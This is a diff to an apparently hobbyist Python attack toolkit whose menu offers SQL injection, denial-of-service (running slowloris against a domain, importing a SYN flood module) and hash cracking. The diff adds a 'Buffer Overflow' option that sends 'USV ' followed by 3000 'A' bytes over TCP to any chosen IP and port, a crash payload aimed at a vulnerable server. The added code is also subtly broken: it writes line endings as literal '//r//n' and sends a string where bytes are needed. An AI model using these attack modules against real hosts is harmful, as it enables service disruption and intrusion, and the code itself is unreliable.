@@ -117,6 +117,7 @@ You have selected the Vulnerability Analysis module
         print(logo)
         print("1. SQL injection")
         print("2. DOS")
+        print("3. Buffer Overflow")
         print("99. Back")
         exChoice = input("Select an attack module: ")
         if exChoice == "1":
@@ -139,7 +140,21 @@ You have selected the Vulnerability Analysis module
                 myCmd = "slowloris -v " + domain
                 os.system(myCmd)
             if doschoice == "2":
-                from modules import syn_flood                 
+                from modules import syn_flood    
+        if exChoice == "3":
+            clear = lambda: os.system('cls')
+            clear() 
+            print(logo)
+            import socket
+            host = input("What is the IP: ")
+            port = int(input("What is the port: "))
+            buffer = "\x41"* 3000
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host,port))
+            s.send("USV " + buffer + "//r//n//r")
+            s.close()
+            print("[+] Packets sent")     
+                         
     if choice == "4":
         print(logo)
         print("Lets crack some hashes")
@@ -221,6 +236,6 @@ You have selected the Vulnerability Analysis module
             print(json.dumps(json_data, indent = 1))
 
     else:
-        return
+        return main
 if __name__ == '__main__':
     main()
